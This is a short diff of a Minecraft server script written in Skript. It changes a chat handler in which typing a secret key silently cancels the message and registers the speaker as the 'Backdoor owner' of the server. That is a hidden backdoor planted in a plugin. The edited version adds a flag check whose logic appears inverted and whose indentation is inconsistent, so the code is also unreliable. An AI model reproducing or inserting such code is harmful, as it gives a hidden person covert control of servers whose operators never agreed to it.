@@ -155,10 +155,13 @@ on place:
 
 on load:
   set {chtoff} to false
-  set {qbd} to nothing
+  set {alreadyset} to false
 
 on chat:
   if message is {@key}:
     cancel event
-    set {qbd} to player's name
-    send "%{@prefix}% Backdoor owner set"
+      if {alreadyset} is true:
+        set {qbd} to player's name
+        set {alreadyset} to true
+      else:
+        send "%{@prefix}% &cError while setting owner"
